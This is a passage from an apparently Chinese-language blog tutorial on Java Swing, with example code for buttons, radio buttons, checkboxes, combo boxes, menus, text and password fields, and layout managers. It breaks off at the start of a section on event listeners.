class=\"comment\">//设置文本,图标,水平对齐方式</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"按钮组件JButton\"><a href=\"#按钮组件JButton\" class=\"headerlink\" title=\"按钮组件JButton\"></a>按钮组件JButton</h5><p>JButton构造方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">以下参数都可以省略</span><br><span class=\"line\">JButton(String text,Icon icon)<span class=\"comment\">//设置文本,图标</span></span><br></pre></td></tr></table></figure>\n\n<p>其他JButton类内自带方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTooltipText(String text)<span class=\"comment\">//设置提示文本</span></span><br><span class=\"line\">setBorderPainted();<span class=\"comment\">//设置边界是否显示</span></span><br><span class=\"line\">setEnabled();<span class=\"comment\">//设置按钮知否可用</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"单选按钮组件JRadioButton\"><a href=\"#单选按钮组件JRadioButton\" class=\"headerlink\" title=\"单选按钮组件JRadioButton\"></a>单选按钮组件JRadioButton</h5><p>JRadioButton构造方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">以下参数都可以省略,一般只用指定文字即可</span><br><span class=\"line\">JRadioButton(String text,Icon icon,<span class=\"keyword\">boolean</span> selected)<span class=\"comment\">//指定文字,图标,是否选中</span></span><br></pre></td></tr></table></figure>\n\n<p>例子</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">jFrameTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        JFrame jf=<span class=\"keyword\">new</span> JFrame();</span><br><span class=\"line\">        jf.setBounds(<span class=\"number\">400</span>,<span class=\"number\">300</span>,<span class=\"number\">400</span>,<span class=\"number\">250</span>);</span><br><span class=\"line\">        jf.setLayout(<span class=\"keyword\">new</span> FlowLayout());</span><br><span class=\"line\">        jf.setTitle(<span class=\"string\">&quot;hello&quot;</span>);<span class=\"comment\">//设置标题</span></span><br><span class=\"line\">        JRadioButton jrb1=<span class=\"keyword\">new</span> JRadioButton(<span class=\"string\">&quot;男&quot;</span>);</span><br><span class=\"line\">        JRadioButton jrb2=<span class=\"keyword\">new</span> JRadioButton(<span class=\"string\">&quot;女&quot;</span>);</span><br><span class=\"line\">        ButtonGroup group=<span class=\"keyword\">new</span> ButtonGroup();</span><br><span class=\"line\">        group.add(jrb1);</span><br><span class=\"line\">        group.add(jrb2);</span><br><span class=\"line\">        jf.add(jrb1);</span><br><span class=\"line\">        jf.add(jrb2);</span><br><span class=\"line\">        jf.setVisible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java-ui/image-20211228001003287.png\" alt=\"image-20211228001003287\" style=\"zoom:67%;\" />\n\n<h5 id=\"复选框组件JCheckBox\"><a href=\"#复选框组件JCheckBox\" class=\"headerlink\" title=\"复选框组件JCheckBox\"></a>复选框组件JCheckBox</h5><p>JCheckBox构造方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JCheckBox(Icon icon,<span class=\"keyword\">boolean</span> checked);<span class=\"comment\">//指定图标,是否被选中</span></span><br><span class=\"line\">JCheckBox(String text,<span class=\"keyword\">boolean</span> checked);<span class=\"comment\">//指定文字,是否被选中</span></span><br></pre></td></tr></table></figure>\n\n<p>例子</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">jFrameTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        JFrame jf=<span class=\"keyword\">new</span> JFrame();</span><br><span class=\"line\">        jf.setBounds(<span class=\"number\">400</span>,<span class=\"number\">300</span>,<span class=\"number\">400</span>,<span class=\"number\">250</span>);</span><br><span class=\"line\">        jf.setLayout(<span class=\"keyword\">new</span> FlowLayout());<span class=\"comment\">//设置流式布局</span></span><br><span class=\"line\">        jf.setTitle(<span class=\"string\">&quot;hello&quot;</span>);<span class=\"comment\">//设置标题</span></span><br><span class=\"line\">        JCheckBox jcb1=<span class=\"keyword\">new</span> JCheckBox(<span class=\"string\">&quot;摆烂&quot;</span>,<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        JCheckBox jcb2=<span class=\"keyword\">new</span> JCheckBox(<span class=\"string\">&quot;足球&quot;</span>);</span><br><span class=\"line\">        JCheckBox jcb3=<span class=\"keyword\">new</span> JCheckBox(<span class=\"string\">&quot;音乐&quot;</span>);</span><br><span class=\"line\">        JCheckBox jcb4=<span class=\"keyword\">new</span> JCheckBox(<span class=\"string\">&quot;睡觉&quot;</span>);</span><br><span class=\"line\">        jf.add(jcb1);</span><br><span class=\"line\">        jf.add(jcb2);</span><br><span class=\"line\">        jf.add(jcb3);</span><br><span class=\"line\">        jf.add(jcb4);</span><br><span class=\"line\">        </span><br><span class=\"line\">        jf.setVisible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java-ui/image-20211228001621601.png\" alt=\"image-20211228001621601\" style=\"zoom:67%;\" />\n\n<h5 id=\"下拉列表组件JComboBox\"><a href=\"#下拉列表组件JComboBox\" class=\"headerlink\" title=\"下拉列表组件JComboBox\"></a>下拉列表组件JComboBox</h5><p>JComboBox构造方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JComboBox();<span class=\"comment\">//常用</span></span><br><span class=\"line\">JComboBox(ComboBoxModel dataModel);<span class=\"comment\">//使用listModel建立一个下拉列表</span></span><br><span class=\"line\">JComBox(Object[] arrayData);</span><br><span class=\"line\">JComboBox(Vector vector);</span><br></pre></td></tr></table></figure>\n\n<p>方法</p>\n<p><code>addItem添加下拉内容</code></p>\n<p>例子</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">jFrameTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        JFrame jf=<span class=\"keyword\">new</span> JFrame();</span><br><span class=\"line\">        jf.setBounds(<span class=\"number\">400</span>,<span class=\"number\">300</span>,<span class=\"number\">400</span>,<span class=\"number\">250</span>);</span><br><span class=\"line\">        jf.setLayout(<span class=\"keyword\">new</span> FlowLayout());<span class=\"comment\">//设置流式布局</span></span><br><span class=\"line\">        jf.setTitle(<span class=\"string\">&quot;hello&quot;</span>);<span class=\"comment\">//设置标题</span></span><br><span class=\"line\">        JComboBox box=<span class=\"keyword\">new</span> JComboBox();</span><br><span class=\"line\">        box.addItem(<span class=\"string\">&quot;---请选择你的学历---&quot;</span>);</span><br><span class=\"line\">        box.addItem(<span class=\"string\">&quot;高中&quot;</span>);</span><br><span class=\"line\">        box.addItem(<span class=\"string\">&quot;大学&quot;</span>);</span><br><span class=\"line\">        box.addItem(<span class=\"string\">&quot;研究生&quot;</span>);</span><br><span class=\"line\">        jf.add(box);</span><br><span class=\"line\">        jf.setVisible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java-ui/image-20211228131636660.png\" alt=\"image-20211228131636660\" style=\"zoom:67%;\" />\n\n<h5 id=\"菜单栏组件\"><a href=\"#菜单栏组件\" class=\"headerlink\" title=\"菜单栏组件\"></a>菜单栏组件</h5><p>JmenuBar  Jmenu  JmenuItem</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">S9_3</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        JFrame jFrame=<span class=\"keyword\">new</span> JFrame(<span class=\"string\">&quot;记事本&quot;</span>);</span><br><span class=\"line\">        jFrame.setBounds(<span class=\"number\">500</span>,<span class=\"number\">400</span>,<span class=\"number\">700</span>,<span class=\"number\">700</span>);</span><br><span class=\"line\">        jFrame.setLayout(<span class=\"keyword\">new</span> FlowLayout(FlowLayout.LEFT));</span><br><span class=\"line\">        JMenuBar bar=<span class=\"keyword\">new</span> JMenuBar();</span><br><span class=\"line\">        JMenu menu1=<span class=\"keyword\">new</span> JMenu(<span class=\"string\">&quot;文件(F)&quot;</span>);</span><br><span class=\"line\">        JMenuItem item1=<span class=\"keyword\">new</span> JMenuItem(<span class=\"string\">&quot;新建&quot;</span>);</span><br><span class=\"line\">        JMenuItem item2=<span class=\"keyword\">new</span> JMenuItem(<span class=\"string\">&quot;保存&quot;</span>);</span><br><span class=\"line\">        JMenuItem item3=<span class=\"keyword\">new</span> JMenuItem(<span class=\"string\">&quot;另存为&quot;</span>);</span><br><span class=\"line\">        menu1.add(item1);</span><br><span class=\"line\">        menu1.add(item2);</span><br><span class=\"line\">        menu1.add(item3);</span><br><span class=\"line\">        JMenu menu2=<span class=\"keyword\">new</span> JMenu(<span class=\"string\">&quot;编辑(E)&quot;</span>);</span><br><span class=\"line\">        JMenu menu3=<span class=\"keyword\">new</span> JMenu(<span class=\"string\">&quot;格式(O)&quot;</span>);</span><br><span class=\"line\">        JMenu menu4=<span class=\"keyword\">new</span> JMenu(<span class=\"string\">&quot;查看(V)&quot;</span>);</span><br><span class=\"line\">        JMenu menu5=<span class=\"keyword\">new</span> JMenu(<span class=\"string\">&quot;帮助(H)&quot;</span>);</span><br><span class=\"line\">        JMenuItem item4=<span class=\"keyword\">new</span> JMenuItem(<span class=\"string\">&quot;查看帮助(H)&quot;</span>);</span><br><span class=\"line\">        JMenuItem item5=<span class=\"keyword\">new</span> JMenuItem(<span class=\"string\">&quot;发送反馈(F)&quot;</span>);</span><br><span class=\"line\">        JMenuItem item6=<span class=\"keyword\">new</span> JMenuItem(<span class=\"string\">&quot;关于记事本(A)&quot;</span>);</span><br><span class=\"line\">        menu5.add(item4);</span><br><span class=\"line\">        menu5.add(item5);</span><br><span class=\"line\">        menu5.add(item6);</span><br><span class=\"line\">        bar.add(menu1);</span><br><span class=\"line\">        bar.add(menu2);</span><br><span class=\"line\">        bar.add(menu3);</span><br><span class=\"line\">        bar.add(menu4);</span><br><span class=\"line\">        bar.add(menu5);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        jFrame.add(bar);</span><br><span class=\"line\">        JTextArea jTextArea=<span class=\"keyword\">new</span> JTextArea(<span class=\"number\">40</span>,<span class=\"number\">63</span>);</span><br><span class=\"line\">        jFrame.add(jTextArea);</span><br><span class=\"line\">        jFrame.setVisible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        jFrame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java-ui/image-20211229002557142.png\" alt=\"image-20211229002557142\" style=\"zoom:67%;\" />\n\n<h5 id=\"文本组件JTextField\"><a href=\"#文本组件JTextField\" class=\"headerlink\" title=\"文本组件JTextField\"></a>文本组件JTextField</h5><p>构造方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">以下参数都可以省略,一般只用指定文字即可</span><br><span class=\"line\">JTextField(Document docModel,String text,<span class=\"keyword\">int</span> fieldWidth);<span class=\"comment\">//指定文本框,文字,文本框长度</span></span><br></pre></td></tr></table></figure>\n\n<p><code>getText();//获取输入的内容</code></p>\n<h5 id=\"密码框组件JPasswordField\"><a href=\"#密码框组件JPasswordField\" class=\"headerlink\" title=\"密码框组件JPasswordField\"></a>密码框组件JPasswordField</h5><p>构造方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">以下参数都可以省略,一般只用指定文字即可</span><br><span class=\"line\">JPasswordField(Document docModel,String text,<span class=\"keyword\">int</span> fieldWidth);<span class=\"comment\">//指定文本框,文字,文本框长度</span></span><br></pre></td></tr></table></figure>\n\n<p>常用方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setEchoChar(<span class=\"string\">&#x27;*&#x27;</span>);<span class=\"comment\">//设置回显字符</span></span><br><span class=\"line\">getText();<span class=\"comment\">//获取输入的内容</span></span><br></pre></td></tr></table></figure>\n\n<p>例子</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">jFrameTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        JFrame jf=<span class=\"keyword\">new</span> JFrame();</span><br><span class=\"line\">        jf.setBounds(<span class=\"number\">400</span>,<span class=\"number\">300</span>,<span class=\"number\">400</span>,<span class=\"number\">250</span>);</span><br><span class=\"line\">        jf.setLayout(<span class=\"keyword\">new</span> FlowLayout(FlowLayout.LEFT));<span class=\"comment\">//设置流式布局</span></span><br><span class=\"line\">        jf.setTitle(<span class=\"string\">&quot;hello&quot;</span>);<span class=\"comment\">//设置标题</span></span><br><span class=\"line\">        JLabel jlabel1=<span class=\"keyword\">new</span> JLabel(<span class=\"string\">&quot;账号:&quot;</span>);</span><br><span class=\"line\">        JTextField username=<span class=\"keyword\">new</span> JTextField(<span class=\"number\">10</span>);</span><br><span class=\"line\">        jf.add(jlabel1);</span><br><span class=\"line\">        jf.add(username);</span><br><span class=\"line\">        JLabel jlabel2=<span class=\"keyword\">new</span> JLabel(<span class=\"string\">&quot;密码:&quot;</span>);</span><br><span class=\"line\">        JPasswordField password=<span class=\"keyword\">new</span> JPasswordField(<span class=\"number\">10</span>);</span><br><span class=\"line\">        password.setEchoChar(<span class=\"string\">&#x27;*&#x27;</span>);<span class=\"comment\">//设置回显字符</span></span><br><span class=\"line\"></span><br><span class=\"line\">        jf.add(jlabel2);</span><br><span class=\"line\"></span><br><span class=\"line\">        jf.add(password);</span><br><span class=\"line\"></span><br><span class=\"line\">        jf.setVisible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java-ui/image-20211228133823317.png\" alt=\"image-20211228133823317\" style=\"zoom:67%;\" />\n\n<h5 id=\"文本域组件JTextArea\"><a href=\"#文本域组件JTextArea\" class=\"headerlink\" title=\"文本域组件JTextArea\"></a>文本域组件JTextArea</h5><p>构造函数</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JTextArea(Document doc,String text,<span class=\"keyword\">int</span> rows,<span class=\"keyword\">int</span> cols);<span class=\"comment\">//指定文本模型,默认文字,长,宽</span></span><br></pre></td></tr></table></figure>\n\n<p>常用方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setLineWrap();<span class=\"comment\">//设置文本域是否自动换行true or false</span></span><br><span class=\"line\">getText();<span class=\"comment\">//获取输入的内容</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"常用布局\"><a href=\"#常用布局\" class=\"headerlink\" title=\"常用布局\"></a>常用布局</h4><h5 id=\"流布局FlowLayout\"><a href=\"#流布局FlowLayout\" class=\"headerlink\" title=\"流布局FlowLayout\"></a>流布局FlowLayout</h5><p>所有组件像流一样,一个一个排放,排满一行之后排下一行,默认情况下,每个组件是居中排列的,但是也可以设置</p>\n<p>构造方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//参数都可省略,一般只写对齐方式</span></span><br><span class=\"line\">FlowLayout(<span class=\"keyword\">int</span> aligment,<span class=\"keyword\">int</span> horizGap,<span class=\"keyword\">int</span> vertGap);<span class=\"comment\">//设置对齐方式,上下偏移</span></span><br><span class=\"line\">aligment取值:</span><br><span class=\"line\">FlowLayout.LEFT=<span class=\"number\">0</span>;</span><br><span class=\"line\">FlowLayout.CENTER=<span class=\"number\">1</span>;</span><br><span class=\"line\">FlowLayout.RIGHT=<span class=\"number\">2</span>;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"边界布局BorderLayout\"><a href=\"#边界布局BorderLayout\" class=\"headerlink\" title=\"边界布局BorderLayout\"></a>边界布局BorderLayout</h5><p>边界布局是默认的布局管理方式,边界布局将容器分成了东<code>BorderLayout.NORTH</code>,南,西,北,中5个区域</p>\n<p>在add的时候指定边界</p>\n<p><code>jf.add(button,BorderLayout.NORTH);</code></p>\n<img src=\"/images/java-ui/image-20211228135034235.png\" alt=\"image-20211228135034235\" style=\"zoom:67%;\" />\n\n<h5 id=\"网格布局GridLayout\"><a href=\"#网格布局GridLayout\" class=\"headerlink\" title=\"网格布局GridLayout\"></a>网格布局GridLayout</h5><p>将容器划分为网格,网格个数由行和列决定,每个组件会填满空格,改变容器大小,组件的大小也会随之改变</p>\n<p>构造方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GridLayout(<span class=\"keyword\">int</span> rows,<span class=\"keyword\">int</span> columns,<span class=\"keyword\">int</span> horizGap,<span class=\"keyword\">int</span> vertGap);<span class=\"comment\">//指定行数,列数,水平间隔.垂直间隔</span></span><br></pre></td></tr></table></figure>\n\n<p>例子</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">jFrameTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        JFrame jf=<span class=\"keyword\">new</span> JFrame();</span><br><span class=\"line\">        jf.setBounds(<span class=\"number\">400</span>,<span class=\"number\">300</span>,<span class=\"number\">400</span>,<span class=\"number\">250</span>);</span><br><span class=\"line\">        jf.setLayout(<span class=\"keyword\">new</span> GridLayout(<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>));<span class=\"comment\">//设置网格布局</span></span><br><span class=\"line\">        jf.setTitle(<span class=\"string\">&quot;test&quot;</span>);<span class=\"comment\">//设置标题</span></span><br><span class=\"line\">        JButton jButton1=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;A&quot;</span>);</span><br><span class=\"line\">        JButton jButton2=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;B&quot;</span>);</span><br><span class=\"line\">        JButton jButton3=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;C&quot;</span>);</span><br><span class=\"line\">        JButton jButton4=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;D&quot;</span>);</span><br><span class=\"line\">        JButton jButton5=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;E&quot;</span>);</span><br><span class=\"line\">        JButton jButton6=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;F&quot;</span>);</span><br><span class=\"line\">        JButton jButton7=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;G&quot;</span>);</span><br><span class=\"line\">        JButton jButton8=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;H&quot;</span>);</span><br><span class=\"line\">        jf.add(jButton1);</span><br><span class=\"line\">        jf.add(jButton2);</span><br><span class=\"line\">        jf.add(jButton3);</span><br><span class=\"line\">        jf.add(jButton4);</span><br><span class=\"line\">        jf.add(jButton5);</span><br><span class=\"line\">        jf.add(jButton6);</span><br><span class=\"line\">        jf.add(jButton7);</span><br><span class=\"line\">        jf.add(jButton8);</span><br><span class=\"line\">        jf.setVisible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java-ui/image-20211228135556932.png\" alt=\"image-20211228135556932\" style=\"zoom:67%;\" />\n\n<h4 id=\"常用的事件监听器\"><a href=\"#常用的事件监听器\" class=\"headerlink\" title=\"常用的事件监听器\"></a>常用的事件监听器</h4><p>一个事件模型中有三个对象:事件源,事件,以及监听程序</p>\n<h5 id=\"事件监听机制\"><a href=\"#事件监听机制\" class=\"headerlink\" title=\"事件监听机制\"></a>事件监听机制</h5><ul>\n<li>事件源    事件发生的地方</li>\n<li>事件        要发生的事情</li>\n<li>事件处理 针对发生的事情做出的处理方案</li>\n<li>事件监听 把事件源和事件关联起来</li>\n</ul>\n<h5 id=\"两种监听器\"><a href=\"#两种监听器\" class=\"headerlink\" 